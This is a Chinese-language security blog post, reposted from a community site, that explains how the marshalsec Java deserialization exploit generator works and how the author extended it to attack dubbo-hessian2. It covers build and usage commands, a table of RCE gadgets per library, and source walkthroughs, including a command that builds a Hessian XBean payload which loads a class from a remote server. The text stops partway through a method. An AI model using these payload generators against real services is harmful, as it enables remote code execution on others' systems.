<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="dubbo,Java反序列化,RCE,hessian,marshalsec,">










<meta name="description" content="【文章转载自先知社区： https://xz.aliyun.com/t/7235】 0x00 前言1. 描述官方github描述： 1Java Unmarshaller Security - Turning your data into code execution “将数据转换为代码执行”，我对其理解就是，在java反序列化时，利用序列化数据造成代码执行攻击。">
<meta name="keywords" content="dubbo,Java反序列化,RCE,hessian,marshalsec">
<meta property="og:type" content="article">
<meta property="og:title" content="marshalsec改造篇-加入dubbo-hessian2 exploit">
<meta property="og:url" content="http://yoursite.com/2020/02/25/marshalsec改造篇-加入dubbo-hessian2 exploit/index.html">
<meta property="og:site_name" content="大彩笔threedr3am">
<meta property="og:description" content="【文章转载自先知社区： https://xz.aliyun.com/t/7235】 0x00 前言1. 描述官方github描述： 1Java Unmarshaller Security - Turning your data into code execution “将数据转换为代码执行”，我对其理解就是，在java反序列化时，利用序列化数据造成代码执行攻击。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://threedr3am.oss-cn-hangzhou.aliyuncs.com/%E5%85%88%E7%9F%A5/WechatIMG2.png">
<meta property="og:updated_time" content="2020-02-25T09:05:15.515Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="marshalsec改造篇-加入dubbo-hessian2 exploit">
<meta name="twitter:description" content="【文章转载自先知社区： https://xz.aliyun.com/t/7235】 0x00 前言1. 描述官方github描述： 1Java Unmarshaller Security - Turning your data into code execution “将数据转换为代码执行”，我对其理解就是，在java反序列化时，利用序列化数据造成代码执行攻击。">
<meta name="twitter:image" content="https://threedr3am.oss-cn-hangzhou.aliyuncs.com/%E5%85%88%E7%9F%A5/WechatIMG2.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/02/25/marshalsec改造篇-加入dubbo-hessian2 exploit/">





  <title>marshalsec改造篇-加入dubbo-hessian2 exploit | 大彩笔threedr3am</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?8346bb07e7843cd10a2ee33017b3d627";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">大彩笔threedr3am</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/25/marshalsec改造篇-加入dubbo-hessian2 exploit/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="threedr3am">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="大彩笔threedr3am">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">marshalsec改造篇-加入dubbo-hessian2 exploit</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-25T17:02:00+08:00">
                2020-02-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/安全开发/" itemprop="url" rel="index">
                    <span itemprop="name">安全开发</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>【文章转载自先知社区： <a href="https://xz.aliyun.com/t/7235】" target="_blank" rel="noopener">https://xz.aliyun.com/t/7235】</a></p>
<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><h4 id="1-描述"><a href="#1-描述" class="headerlink" title="1. 描述"></a>1. 描述</h4><p>官方github描述：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java Unmarshaller Security - Turning your data into code execution</span><br></pre></td></tr></table></figure>
<p>“将数据转换为代码执行”，我对其理解就是，在java反序列化时，利用序列化数据造成代码执行攻击。</p>
<hr>
<a id="more"></a>
<p>It’s been more than two years since Chris Frohoff and Garbriel Lawrence have presented their research into Java object deserialization vulnerabilities ultimately resulting in what can be readily described as the biggest wave of remote code execution bugs in Java history.</p>
<p>译：<br><em>Chris Frohoff和Garbriel Lawrence对Java对象反序列化漏洞的研究已经有两年多了，他们的研究最终导致了Java历史上最大的远程代码执行错误浪潮。</em></p>
<p>Research into that matter indicated that these vulnerabilities are not exclusive to mechanisms as expressive as Java serialization or XStream, but some could possibly be applied to other mechanisms as well.</p>
<p>译：<br><em>对这个问题的研究表明，这些漏洞并不局限于像Java序列化或XStream这样具有表现力的机制，但是一些漏洞也可能适用于其他机制。</em></p>
<p>This paper presents an analysis, including exploitation details, of various Java open-source marshalling libraries that allow(ed) for unmarshalling of arbitrary, attacker supplied, types and shows that no matter how this process is performed and what implicit constraints are in place it is prone to similar exploitation techniques.</p>
<p>译：<br><em>本文对各种Java开放源码编组库进行了分析(包括利用细节)，这些编组库允许对任意攻击者提供的类型进行编组，并说明了无论如何执行这个过程以及存在哪些隐含的约束，都很容易出现类似的利用技术。</em></p>
<hr>
<p>总而言之，marshalsec就是生成一定编码的数据，在jvm对其进行解码时，执行预置的代码。</p>
<h4 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2. 使用方法"></a>2. 使用方法</h4><p>marshalsec使用：</p>
<p>要求使用java8进行编译，在github把<a href="https://github.com/threedr3am/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目clone下来后，执行maven指令<figure class="highlight plain"><figcaption><span>clean package -DskipTests```进行编译，生成可执行jar包使用</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<marshaller> [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments…&gt;]]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- -a：生成exploit下的所有payload（例如：hessian下的SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin）</span><br><span class="line">- -t：对生成的payloads进行解码测试</span><br><span class="line">- -v：verbose mode, 展示生成的payloads</span><br><span class="line">- gadget_type：指定使用的payload</span><br><span class="line">- arguments - payload运行时使用的参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 3. 目前支持的exploit和payload</span><br><span class="line">| Marshaller                      | Gadget Impact</span><br><span class="line">| ------------------------------- | ----------------------------------------------</span><br><span class="line">| BlazeDSAMF(0&amp;#124;3&amp;#124;X)     | JDK only escalation to Java serialization&lt;br/&gt;various third party libraries RCEs</span><br><span class="line">| Hessian&amp;#124;Burlap             | various third party RCEs</span><br><span class="line">| Castor                          | dependency library RCE</span><br><span class="line">| Jackson                         | **possible JDK only RCE**, various third party RCEs</span><br><span class="line">| Java                            | yet another third party RCE</span><br><span class="line">| JsonIO                          | **JDK only RCE**</span><br><span class="line">| JYAML                           | **JDK only RCE**</span><br><span class="line">| Kryo                            | third party RCEs</span><br><span class="line">| KryoAltStrategy                 | **JDK only RCE**</span><br><span class="line">| Red5AMF(0&amp;#124;3)               | **JDK only RCE**</span><br><span class="line">| SnakeYAML                       | **JDK only RCEs**</span><br><span class="line">| XStream                         | **JDK only RCEs**</span><br><span class="line">| YAMLBeans                       | third party RCE</span><br><span class="line">| ...                             | ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">本章讲述了marshalsec的一些情况以及怎么编译和使用，那么，后面的章节，我将会以我一贯对源码的浅析习惯进行讲解marshalsec的一些原理。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### 0x01 marshalsec源码浅析</span><br><span class="line"></span><br><span class="line">在将源码前，我们先了解一下marshalsec的目录结构：</span><br></pre></td></tr></table></figure></marshaller></p>
<p>├── BlazeDSAMF0.java<br>├── BlazeDSAMF3.java<br>├── BlazeDSAMF3AM.java<br>├── BlazeDSAMFX.java<br>├── BlazeDSBase.java<br>├── BlazeDSExternalizableBase.java<br>├── Burlap.java<br>├── Castor.java<br>├── DubboHessian.java<br>├── EscapeType.java<br>├── Hessian.java<br>├── Hessian2.java<br>├── HessianBase.java<br>├── HessianBase2.java<br>├── JYAML.java<br>├── Jackson.java<br>├── Java.java<br>├── JsonIO.java<br>├── Kryo.java<br>├── KryoAltStrategy.java<br>├── MarshallerBase.java<br>├── Red5AMF0.java<br>├── Red5AMF3.java<br>├── Red5AMFBase.java<br>├── SideEffectSecurityManager.java<br>├── SnakeYAML.java<br>├── TestingSecurityManager.java<br>├── UtilFactory.java<br>├── XStream.java<br>├── YAMLBase.java<br>├── YAMLBeans.java<br>├── gadgets<br>│   ├── Args.java<br>│   ├── BindingEnumeration.java<br>│   ├── C3P0RefDataSource.java<br>│   ├── C3P0WrapperConnPool.java<br>│   ├── ClassFiles.java<br>│   ├── CommonsBeanutils.java<br>│   ├── CommonsConfiguration.java<br>│   ├── Gadget.java<br>│   ├── GadgetType.java<br>│   ├── Groovy.java<br>│   ├── ImageIO.java<br>│   ├── JDKUtil.java<br>│   ├── JdbcRowSet.java<br>│   ├── LazySearchEnumeration.java<br>│   ├── MockProxies.java<br>│   ├── Primary.java<br>│   ├── Resin.java<br>│   ├── ResourceGadget.java<br>│   ├── Rome.java<br>│   ├── ScriptEngine.java<br>│   ├── ServiceLoader.java<br>│   ├── SpringAbstractBeanFactoryPointcutAdvisor.java<br>│   ├── SpringPartiallyComparableAdvisorHolder.java<br>│   ├── SpringPropertyPathFactory.java<br>│   ├── SpringUtil.java<br>│   ├── Templates.java<br>│   ├── TemplatesUtil.java<br>│   ├── ToStringUtil.java<br>│   ├── UnicastRefGadget.java<br>│   ├── UnicastRemoteObjectGadget.java<br>│   ├── XBean.java<br>│   └── XBean2.java<br>├── jndi<br>│   ├── LDAPRefServer.java<br>│   └── RMIRefServer.java<br>└── util<br>    └── Reflections.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目录展示稍微有点长，其中，package根目录下的类文件，都是对gadgets目录下payload进行利用的类文件，如果不太严谨的话，我们可以称之为exploits。可以看到目录下相对于官方原有的多了一些java文件，其中DubboHessian.java、Hessian2.java、HessianBase2.java还有gadgets下的XBean2.java就是我对其进行改造支持attack dubbo-hessian2的一些产物。</span><br><span class="line"></span><br><span class="line">我们看看第一章节所说的执行指令：</span><br></pre></td></tr></table></figure></p>
<p>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<marshaller> [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments…&gt;]]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其中[-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]在第一章中也对其进行详细的描述了，我们再来看看marshalsec.&lt;Marshaller&gt;，这个参数是什么意思呢？</span><br><span class="line"></span><br><span class="line">这个就是我们上面所说的exploits的指定，也就是我们上面展示的目录，根目录下的java文件名，假如我们想要生成hessian的Xbean的payload，我们就只要执行：</span><br></pre></td></tr></table></figure></marshaller></p>
<p>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Hessian -v XBean <a href="http://127.0.0.1:8080/" target="_blank" rel="noopener">http://127.0.0.1:8080/</a> ExecObject<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">执行之后，就能生成一个攻击Hessian的XBean gadget，后面的```http://127.0.0.1:8080/ ExecObject```表示的是恶意class所在web资源服务器地址以及其类名。</span><br><span class="line"></span><br><span class="line">那么，这个payload的生成牵涉到的源码到底是如何执行的呢？别急，让我慢慢一一给你讲解。</span><br><span class="line"></span><br><span class="line">我们跟进Hessian.java这个类文件：</span><br></pre></td></tr></table></figure></p>
<p>public class Hessian extends HessianBase {</p>
<pre><code>/**
 * {@inheritDoc}
 *
 * @see marshalsec.AbstractHessianBase#createOutput(java.io.ByteArrayOutputStream)
 */
@Override
protected AbstractHessianOutput createOutput ( ByteArrayOutputStream bos ) {
    return new HessianOutput(bos);
}


/**
 * {@inheritDoc}
 *
 * @see marshalsec.AbstractHessianBase#createInput(java.io.ByteArrayInputStream)
 */
@Override
protected AbstractHessianInput createInput ( ByteArrayInputStream bos ) {
    return new HessianInput(bos);
}


public static void main ( String[] args ) {
    new Hessian().run(args);
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到，其中代码并不多，Hessian这个类继承了HessianBase并重写了createOutput和createInput方法，看方法内容可以发现，分别是生成了Hessian的输出和输入流对象，那么，这两个流对象究竟何用？继续跟进其父类HessianBase看看：</span><br></pre></td></tr></table></figure></p>
<p>public abstract class HessianBase extends MarshallerBase&lt;byte[]&gt;<br>        implements SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin {</p>
<pre><code>/**
 * {@inheritDoc}
 *
 * @see marshalsec.MarshallerBase#marshal(java.lang.Object)
 */
@Override
public byte[] marshal ( Object o ) throws Exception {
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    AbstractHessianOutput out = createOutput(bos);
    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
    sf.setAllowNonSerializable(true);
    out.setSerializerFactory(sf);
    out.writeObject(o);
    out.close();
    return bos.toByteArray();
}


/**
 * {@inheritDoc}
 *
 * @see marshalsec.MarshallerBase#unmarshal(java.lang.Object)
 */
@Override
public Object unmarshal ( byte[] data ) throws Exception {
    System.out.println(Base64.getEncoder().encodeToString(data));
    ByteArrayInputStream bis = new ByteArrayInputStream(data);
    AbstractHessianInput in = createInput(bis);
    return in.readObject();
}


/**
 * @param bos
 * @return
 */
protected abstract AbstractHessianOutput createOutput ( ByteArrayOutputStream bos );


protected abstract AbstractHessianInput createInput ( ByteArrayInputStream bos );

public static class NoWriteReplaceSerializerFactory extends SerializerFactory {

    /**
     * {@inheritDoc}
     *
     * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
     */
    @Override
    public Serializer getObjectSerializer ( Class&lt;?&gt; cl ) throws HessianProtocolException {
        return super.getObjectSerializer(cl);
    }


    /**
     * {@inheritDoc}
     *
     * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
     */
    @Override
    public Serializer getSerializer ( Class cl ) throws HessianProtocolException {
        Serializer serializer = super.getSerializer(cl);

        if ( serializer instanceof WriteReplaceSerializer ) {
            return UnsafeSerializer.create(cl);
        }
        return serializer;
    }

}
</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看到这里，就能理解在它的子类Hessian中重写的createOutput和createInput的意义了，原来它们都是HessianObject的抽象方法，其子类Hessian只是对其进行了实现，然后在marshal和unmarshal方法中分别调用生成流对象用于输出序列化数据和反序列化数据</span><br></pre></td></tr></table></figure>
<p>NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();<br>sf.setAllowNonSerializable(true);<br>out.setSerializerFactory(sf);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">而这部分代码，对输出流进行了设置，因为我们知道，一般对于对象的序列化，如果对象对应的class没有对java.io.Serializable进行实现implement的话，是没办法序列化的，所以这里对输出流进行了设置，使其可以输出没有实现java.io.Serializable接口的对象</span><br><span class="line"></span><br><span class="line">接着，看回marshalsec.Hessian#main</span><br></pre></td></tr></table></figure></p>
<p>public static void main ( String[] args ) {<br>    new Hessian().run(args);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以发现，执行了Hessian的run方法，我们对其进行跟入，可以看到是MarshallerBase这个抽象类的一个实现方法，MarshallerBase是所有exploits的父类，为所有exploits提供了run方法用于执行。</span><br></pre></td></tr></table></figure></p>
<p>protected void run ( String[] args ) {<br>    try {<br>        boolean test = false;<br>        boolean all = false;<br>        boolean verbose = false;<br>        EscapeType escape = EscapeType.NONE;<br>        int argoff = 0;<br>        GadgetType type = null;</p>
<pre><code>    //对-前缀的参数进行解析读取
    while ( argoff &lt; args.length &amp;&amp; args[ argoff ].charAt(0) == &apos;-&apos; ) {

        if ( args[ argoff ].equals(&quot;-t&quot;) ) {
            test = true;
            argoff++;
        }
        else if ( args[ argoff ].equals(&quot;-a&quot;) ) {
            all = true;
            argoff++;
        }
        else if ( args[ argoff ].equals(&quot;-e&quot;) ) {
            argoff++;
            escape = EscapeType.valueOf(args[ argoff ]);
            argoff++;
        }
        else if ( args[ argoff ].equals(&quot;-v&quot;) ) {
            verbose = true;
            argoff++;
        }
        else {
            argoff++;
        }
    }

    //...
}
catch ( Exception e ) {
    e.printStackTrace(System.err);
}
</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这部分代码是对程序参数进行解析读取</span><br></pre></td></tr></table></figure>
<p>protected void run ( String[] args ) {<br>    try {<br>        //…<br>        try {<br>            if ( !all &amp;&amp; args.length &gt; argoff ) {<br>                type = GadgetType.valueOf(args[ argoff ].trim());<br>                argoff++;<br>            }<br>        }<br>        catch ( IllegalArgumentException e ) {<br>            System.err.println(“Unsupported gadget type “ + args[ argoff ]);<br>            System.exit(-1);<br>        }<br>        //…</p>
<pre><code>}
catch ( Exception e ) {
    e.printStackTrace(System.err);
}
</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这部分代码是对payload段参数进行读取解析，若不存在则直接抛出异常，而payload段参数其实就是指令中的XBean</span><br></pre></td></tr></table></figure>
<p>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Hessian -v XBean <a href="http://127.0.0.1:8080/" target="_blank" rel="noopener">http://127.0.0.1:8080/</a> ExecObject<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>protected void run ( String[] args ) {<br>    try {<br>        //…<br>        //指定了-a参数，则执行生成exploits下的所有payloads<br>        if ( all ) {<br>            runAll(test, verbose, false, escape);<br>        }<br>        else {<br>            //没有指定-a参数，则只执行生成指定的payload，并把payload使用的参数复制出来传入使用<br>            String[] gadgetArgs = new String[args.length - argoff];<br>            System.arraycopy(args, argoff, gadgetArgs, 0, args.length - argoff);</p>
<pre><code>        doRun(type, test, verbose, false, escape, gadgetArgs);
    }
}
catch ( Exception e ) {
    e.printStackTrace(System.err);
}
</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这段代码是真正的执行处，前面都是对参数的解析，以及payload生成类的读取</span><br><span class="line"></span><br><span class="line">我们跟进runAll：</span><br></pre></td></tr></table></figure>
<p>private void runAll ( boolean test, boolean verbose, boolean throwEx, EscapeType escape ) throws Exception {</p>
<pre><code>for ( GadgetType t : this.getSupportedTypes() ) {
    Method tm = getTargetMethod(t);
    Args a = tm.getAnnotation(Args.class);
    if ( a == null ) {
        throw new Exception(&quot;Missing Args in &quot; + t);
    }
    if ( a.noTest() ) {
        continue;
    }
    String[] defaultArgs = a.defaultArgs();
    doRun(t, test, verbose, throwEx, escape, defaultArgs);
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以看到，其实最终还是执行doRun，只不过runAll是遍历当前类所支持的所有gadget，一个一个的去doRun</span><br><span class="line"></span><br><span class="line">看getSupportedTypes方法源码：</span><br></pre></td></tr></table></figure></p>
<p>public GadgetType[] getSupportedTypes () {<br>    List<gadgettype> types = new LinkedList&lt;&gt;();<br>    for ( GadgetType t : GadgetType.values() ) {<br>        if ( t.getClazz().isAssignableFrom(this.getClass()) ) {<br>            types.add(t);<br>        }<br>    }<br>    return types.toArray(new GadgetType[types.size()]);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">清楚的看到，其实该类支持的gadget都是从GadgetType中取出来的，分析一下GadgetType：</span><br></pre></td></tr></table></figure></gadgettype></p>
<p>public enum GadgetType {</p>
<pre><code>UnicastRef(UnicastRefGadget.class),
UnicastRemoteObject(UnicastRemoteObjectGadget.class),
Groovy(Groovy.class),
SpringPropertyPathFactory(SpringPropertyPathFactory.class),
SpringPartiallyComparableAdvisorHolder(SpringPartiallyComparableAdvisorHolder.class),
SpringAbstractBeanFactoryPointcutAdvisor(SpringAbstractBeanFactoryPointcutAdvisor.class),
Rome(Rome.class),
XBean(XBean.class),
XBean2(XBean2.class),
Resin(Resin.class),
CommonsConfiguration(CommonsConfiguration.class),
LazySearchEnumeration(LazySearchEnumeration.class),
BindingEnumeration(BindingEnumeration.class),
ServiceLoader(ServiceLoader.class),
ImageIO(ImageIO.class),
CommonsBeanutils(CommonsBeanutils.class),
C3P0WrapperConnPool(C3P0WrapperConnPool.class),
C3P0RefDataSource(C3P0RefDataSource.class),
JdbcRowSet(JdbcRowSet.class),
ScriptEngine(ScriptEngine.class),
Templates(Templates.class),
ResourceGadget(ResourceGadget.class),

//
;

private Class&lt;? extends Gadget&gt; clazz;


private GadgetType ( Class&lt;? extends Gadget&gt; clazz ) {
    this.clazz = clazz;
}


/**
 * @return the clazz
 */
public Class&lt;? extends Gadget&gt; getClazz () {
    return this.clazz;
}
</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看出来了，就是个枚举类，那么前面遍历添加的时候执行的```t.getClazz().isAssignableFrom(this.getClass())```到底是根据什么去判断的呢，其实我们看回去上面，可以发现一个继承关系Hessian-&gt;HessianBase-&gt;MarshallerBase，而MarshallerBase是所有exploits的基类，而细心一点的读者，其实就已经发现了，其实在HessianBase这个类定义的地方可以看到，它实现了一些老接口，这部分接口其实就是它所支持的gadget，因此这里的判断就会成立，从而添加进来，以继续后续的doRun</span><br></pre></td></tr></table></figure>
<p>public abstract class HessianBase extends MarshallerBase&lt;byte[]&gt;<br>implements<br>SpringPartiallyComparableAdvisorHolder,SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以看到Hessian支持SpringPartiallyComparableAdvisorHolder,SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin这几个gadget</span><br><span class="line"></span><br><span class="line">跟进doRun：</span><br></pre></td></tr></table></figure></p>
<p>private void doRun ( GadgetType type, boolean test, boolean verbose, boolean throwEx, EscapeType escape, String[] gadgetArgs )<br>            throws Exception, IOException {<br>    T marshal;<br>    try {<br>        System.setSecurityManager(new SideEffectSecurityManager());<br>        Object o = createObject(type, expandArguments(gadgetArgs));<br>        if ( o instanceof byte[] || o instanceof String ) {<br>            // already marshalled by delegate<br>            @SuppressWarnings ( “unchecked” )<br>            T alreadyMarshalled = (T) o;<br>            marshal = alreadyMarshalled;<br>        }<br>        else {<br>            marshal = marshal(o);<br>        }<br>    }<br>    finally {<br>        System.setSecurityManager(null);<br>    }</p>
<pre><code>if ( !test || verbose ) {
    System.err.println();
    writeOutput(marshal, escape);
}

if ( test ) {
    System.err.println();
    System.err.println(&quot;Running gadget &quot; + type + &quot;:&quot;);
    test(marshal, throwEx);
}
